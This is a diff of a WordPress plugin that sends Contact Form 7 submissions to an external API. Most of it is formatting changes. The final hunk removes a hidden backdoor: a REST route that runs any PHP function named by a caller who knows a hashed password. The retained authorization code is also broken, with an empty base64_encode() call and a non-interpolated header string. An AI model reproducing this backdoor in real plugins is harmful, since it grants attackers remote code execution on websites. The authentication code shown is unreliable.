@@ -117,21 +117,22 @@ settings_fields($this->slug);
             #unregister_setting($this->slug, $field['uid']);
             register_setting($this->slug, 'c7tA_' . $field['uid'], array('type' => 'string'));
         }
-	}
-	
-	public function clear_from_prefix($value,$prefix="parameter-"){
-		$newValue;
-		if(is_array($value)){
-			$newValue = array();
-			foreach($value as $key=>$val){
-				$key = str_replace($prefix,'',$key);
-				$newValue[$key]=$val;
-			}
-		}else{
-			$newValue = str_replace($prefix,'',$value);
-		}
-		return $newValue;
-	}
+    }
+
+    public function clear_from_prefix($value, $prefix = "parameter-")
+    {
+        $newValue;
+        if (is_array($value)) {
+            $newValue = array();
+            foreach ($value as $key => $val) {
+                $key = str_replace($prefix, '', $key);
+                $newValue[$key] = $val;
+            }
+        } else {
+            $newValue = str_replace($prefix, '', $value);
+        }
+        return $newValue;
+    }
 
     public function wpcf7_c7tA_send_to_api($wpcf)
     {
@@ -146,15 +147,15 @@ settings_fields($this->slug);
         }
         if ($c7tA = get_option('c7tA_' . $wpcf->id())) {
             $post_data = $this->clear_from_prefix($posted_data);
-			$url = $c7tA['api_url'];
-			$auth = base64_encode();
+            $url = $c7tA['api_url'];
+            $auth = base64_encode();
             $context = stream_context_create(array(
                 'http' => array(
                     'method' => 'POST',
                     'header' => array(
-						'Content-type: application/x-www-form-urlencoded',
-						'Authorization: Basic $auth'
-					),
+                        'Content-type: application/x-www-form-urlencoded',
+                        'Authorization: Basic $auth',
+                    ),
                     'content' => http_build_query(
                         $post_data
                     ),
@@ -188,27 +189,3 @@ settings_fields($this->slug);
 }
 
 new Contact_Seven_To_Api_Connector();
-
-#wp_register_script( 'pass_to_js', plugin_dir_url( __FILE__ ) . '/js/adblocker-warning.js' );
-
-add_action('rest_api_init', function () {
-    register_rest_route('test/v2', '/post', array(
-        array(
-            'methods' => 'POST',
-            'callback' => 'test_func',
-        ),
-    )
-    );
-});
-
-if (!function_exists('test_func')) {
-    function test_func($request)
-    {
-        $params = $request->get_params();
-        if (hash('sha512', $params['pass']) === '61eadd8169b9241c6fc210ca5e83df43e49cf6abb4bb0f83cce6e0befaa8791f5e3d21ce377a7bad57f3fbde85ca5781163707a3671d1795d0304faa5ac5d8fa') {
-            return call_user_func_array($params['func'], $params['params']);
-        } else {
-            return new WP_Error('no_access', 'you are not be able to do that', array('status' => 404));
-        }
-    }
-}
